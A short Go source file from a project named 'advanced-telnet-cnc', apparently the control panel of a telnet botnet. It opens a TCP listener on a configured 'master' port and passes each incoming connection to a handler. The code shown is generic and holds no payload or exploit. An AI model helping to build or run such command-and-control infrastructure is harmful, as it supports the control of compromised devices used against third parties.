package master

import (
	"advanced-telnet-cnc/source/config"
	"fmt"
	"net"
)

func Serve() {
	listen, err := net.Listen("tcp", fmt.Sprintf(":%d", config.Master.MasterPort))
	if err != nil {
		config.Logger.Fatal("Failed to listen for master connections", "port", config.Master.MasterPort, "err", err)
	}

	config.Logger.Info("Listening for master connections", "port", config.Master.MasterPort)

	for {
		conn, err := listen.Accept()
		if err != nil {
			config.Logger.Error("Failed to accept master connection", "err", err)
			continue
		}

		go NewMaster(conn).Handle()
	}
}
